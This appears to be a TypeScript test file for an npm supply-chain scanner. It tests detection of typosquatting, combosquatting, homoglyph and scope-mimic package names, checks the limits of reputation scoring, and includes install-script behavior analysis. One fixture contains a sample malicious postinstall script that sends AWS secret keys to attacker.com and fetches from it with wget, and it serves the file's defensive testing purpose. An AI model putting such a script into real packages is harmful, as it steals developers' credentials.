import { test } from "node:test";
import assert from "node:assert/strict";
import {
  detectTyposquat,
  detectCombosquat,
  detectHomoglyph,
  detectScopeMimic,
  detectAdvancedTyposquat,
  POPULAR_NPM_PACKAGES,
} from "../src/engines/dep-intel.ts";
import { scorePackage } from "../src/engines/reputation-scorer.ts";
import { analyzeBehavior } from "../src/engines/behavior-analyzer.ts";

// ───────────────────────────────────────────────
// Typosquat boundary cases
// ───────────────────────────────────────────────

test("typosquat: names with edit distance ≥ 3 from any popular package are NOT flagged", () => {
  // WHY: distance > 2 is too far to be a credible typo. Flagging this would create
  // unacceptable noise on legitimate names. Use a name unrelated to any popular pkg.
  const match = detectTyposquat("totallyrandomname");
  assert.equal(match, null);
});

test("typosquat: very short names (< 3 chars) are not flagged", () => {
  // WHY: 2-char names have huge collision space and many real packages exist (e.g. "ms").
  assert.equal(detectTyposquat("ld"), null);
});

test("typosquat: scoped packages are not put through unscoped detector", () => {
  // WHY: @scope/name patterns are handled by detectScopeMimic / dep-confusion, not edit-distance.
  assert.equal(detectTyposquat("@types/node"), null);
});

test("combosquat: lodash-pro is flagged as combosquat of lodash", () => {
  // WHY: combosquat with a popularity-implying suffix is the biggest unguarded vector.
  const match = detectCombosquat("lodash-pro");
  assert.equal(match, "lodash");
});

test("combosquat: react-utils is flagged", () => {
  // WHY: react-utils is the canonical example from the spec.
  const match = detectCombosquat("react-utils");
  assert.equal(match, "react");
});

test("combosquat: legitimate prefixed packages stay clean", () => {
  // WHY: "node-cron" is a real popular package that contains "cron" but isn't a combosquat.
  // Make sure detectCombosquat doesn't fire on it.
  const match = detectCombosquat("node-cron");
  assert.equal(match, null);
});

test("homoglyph: '1odash' (digit 1 vs letter l) flags as lookalike of 'lodash'", () => {
  // WHY: visual confusion attack — looks identical to the eye in many monospaced fonts.
  const match = detectHomoglyph("1odash");
  assert.equal(match, "lodash");
});

test("homoglyph: 'expresss' (triple s) flags as lookalike of 'express'", () => {
  // WHY: repeated-letter swap is a common lookalike vector.
  const match = detectHomoglyph("expresss");
  assert.equal(match, "express");
});

test("homoglyph: legitimate name with no substitutions returns null", () => {
  // WHY: don't false-positive on pure-letter names.
  assert.equal(detectHomoglyph("axios"), null);
});

test("scope-mimic: 'react-dialog' (unscoped) flags as mimic of '@radix-ui/react-dialog'", () => {
  // WHY: an unscoped package mirroring a known scoped one is a credible squat surface.
  // Using @radix-ui/react-dialog because the inner ('react-dialog') is NOT itself a
  // top-level popular package, so the scope-mimic detector can fire cleanly.
  const match = detectScopeMimic("react-dialog");
  assert.equal(match, "@radix-ui/react-dialog");
});

test("scope-mimic: an actual popular package is not flagged as mimicking itself", () => {
  // WHY: regression test for a bug we shipped earlier where 'lodash' was flagged as mimicking @types/lodash.
  for (const pop of POPULAR_NPM_PACKAGES) {
    if (pop.startsWith("@")) continue;
    assert.equal(detectScopeMimic(pop), null, `${pop} should not be flagged as scope-mimic`);
  }
});

test("advanced typosquat: returns null for known-good 'lodash'", () => {
  // WHY: end-to-end confidence that the dispatcher doesn't false-positive on canonical names.
  assert.equal(detectAdvancedTyposquat("lodash"), null);
});

test("advanced typosquat: every detector path is reachable from the dispatcher", () => {
  // WHY: the dispatcher tries edit-distance first; for cases that BOTH edit-distance and a
  // later detector would match, edit-distance wins. We pick inputs that can ONLY be flagged
  // by the target detector (edit distance > 2) so we observe each `kind` value.
  assert.equal(detectAdvancedTyposquat("lodahs")?.kind, "edit-distance");
  assert.equal(detectAdvancedTyposquat("lodash-pro")?.kind, "combosquat");
  // expressssss has edit distance 4 from "express" (4 deletions), so it can ONLY be flagged
  // via homoglyph (collapse 3+ to 2).
  assert.equal(detectAdvancedTyposquat("expressssss")?.kind, "homoglyph");
  assert.equal(detectAdvancedTyposquat("react-dialog")?.kind, "scope-mimic");
});

// ───────────────────────────────────────────────
// Reputation scoring boundary cases
// ───────────────────────────────────────────────

test("reputation: score is clamped to ≤ 100 (no overflow on perfect signals)", () => {
  // WHY: stacking +20 + +10 + +10 + +5 + +5 + +3 + +5 + +10 = +68 from a baseline of 50 = 118.
  // Without clamping, the displayed score would be > 100 — confusing UX bug.
  const score = scorePackage({
    name: "perfect",
    weeklyDownloads: 5_000_000,
    created: new Date("2015-01-01"),
    modified: new Date(),
    maintainerCount: 5,
    repository: "https://github.com/x/y",
    homepage: "https://x.com",
    latestVersion: "5.4.2",
    dependents: 50_000,
  });
  assert.ok(score.score <= 100, `expected ≤100, got ${score.score}`);
});

test("reputation: score is clamped to ≥ 0 (no underflow on terrible signals)", () => {
  // WHY: -30 (>4y) + -5 (single) + -20 (<100 dl) + -10 (no repo) + -5 (0.x) + -15 (spike) + -20 (owner change)
  // = -105 from baseline 50 = -55. Without clamping we'd display a negative score.
  const score = scorePackage({
    name: "abandoned",
    modified: new Date("2018-01-01"),  // > 4 years ago in 2026
    created: new Date("2018-01-01"),
    maintainerCount: 1,
    weeklyDownloads: 5,
    weeklyDownloadsPrev: 0,
    repository: null,
    latestVersion: "0.1.2",
    maintainerChangedRecently: true,
  });
  assert.ok(score.score >= 0, `expected ≥0, got ${score.score}`);
});

test("reputation: spike signal records a sudden 10x download jump", () => {
  // WHY: a typosquat usually has near-zero downloads then jumps when victims start installing.
  // The -15 spike penalty is the early-warning signal.
  const score = scorePackage({
    name: "suspicious",
    weeklyDownloads: 50_000,
    weeklyDownloadsPrev: 1_000,
    modified: new Date(),
  });
  const spike = score.signals.find((s) => /spike/i.test(s.reason));
  assert.ok(spike, `expected a spike signal, got: ${score.signals.map((s) => s.reason).join("; ")}`);
});

test("reputation: maintainer-changed-recently signal applied", () => {
  // WHY: account-takeover attacks (eslint-scope, ua-parser-js, coa, rc) all involved a recent
  // maintainer transfer. This signal is the most predictive of a hijack.
  const score = scorePackage({
    name: "x",
    weeklyDownloads: 200_000,
    modified: new Date(),
    maintainerChangedRecently: true,
  });
  const sig = score.signals.find((s) => /maintain/i.test(s.reason));
  assert.ok(sig, `expected a maintainer-change signal, got: ${score.signals.map((s) => s.reason).join("; ")}`);
});

// ───────────────────────────────────────────────
// Behavior analyzer extra coverage
// ───────────────────────────────────────────────

test("behavior: postinstall with wget + process.env flags CRITICAL", () => {
  // WHY: wget is just as dangerous as curl in an install script — both can exfiltrate env vars.
  // The analyzer detects env access via the literal `process.env` token, so the script must use it.
  const findings = analyzeBehavior({
    packageName: "evil",
    packageVersion: "1.0.0",
    source: "package.json",
    packageJson: JSON.stringify({
      name: "evil",
      version: "1.0.0",
      scripts: {
        postinstall: "node -e \"require('http').get('http://attacker.com/' + process.env.AWS_SECRET_ACCESS_KEY)\" && wget https://attacker.com/ping",
      },
    }),
  });
  const critical = findings.find((f) => f.severity === "critical");
  assert.ok(critical, `expected a critical finding for network+env, got: ${findings.map((f) => `${f.severity}:${f.summary}`).join(" | ")}`);
});

test("behavior: postinstall with wget alone (no env access) flags HIGH not CRITICAL", () => {
  // WHY: lock in the severity gradient — network primitive alone is HIGH, not CRITICAL.
  // CRITICAL is reserved for network + env access combo (the actual exfiltration vector).
  const findings = analyzeBehavior({
    packageName: "wgetonly",
    packageVersion: "1.0.0",
    source: "package.json",
    packageJson: JSON.stringify({
      name: "wgetonly",
      version: "1.0.0",
      scripts: { postinstall: "wget https://example.com/ping" },
    }),
  });
  const top = findings.sort((a, b) => (a.severity === "critical" ? -1 : 1) - (b.severity === "critical" ? -1 : 1))[0];
  assert.ok(top);
  assert.equal(top.severity, "high");
});

test("behavior: clean package.json without scripts produces no findings", () => {
  // WHY: false-positive guard — most npm packages have no install scripts and shouldn't be flagged.
  const findings = analyzeBehavior({
    packageName: "clean",
    packageVersion: "1.0.0",
    source: "package.json",
    packageJson: JSON.stringify({
      name: "clean",
      version: "1.0.0",
      main: "index.js",
      dependencies: { "ms": "^2.1.0" },
    }),
  });
  assert.equal(findings.length, 0, `expected 0, got: ${findings.map((f) => f.summary).join(" | ")}`);
});

test("behavior: malformed package.json doesn't throw", () => {
  // WHY: hardened input — a corrupt package.json in node_modules shouldn't crash the scan.
  const findings = analyzeBehavior({
    packageName: "broken",
    packageVersion: "1.0.0",
    source: "package.json",
    packageJson: "{ this is not valid json",
  });
  assert.ok(Array.isArray(findings));
});
